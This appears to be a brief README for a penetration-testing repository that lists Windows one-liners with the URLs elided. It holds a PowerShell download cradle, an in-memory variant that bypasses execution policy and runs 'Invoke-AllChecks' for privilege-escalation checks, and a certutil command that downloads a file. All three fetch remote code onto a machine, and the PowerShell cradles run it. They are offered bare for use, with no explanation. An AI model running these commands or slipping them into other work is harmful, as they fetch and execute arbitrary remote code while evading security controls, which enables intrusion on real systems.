# tools
Helpful pentest tools

Simple Download:
IEX (New-Object Net.WebClient).DownloadString(‘http://...’)

In-Memory:
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://...’); Invoke-AllChecks”

certutil -urlcache -split -f "http://..."
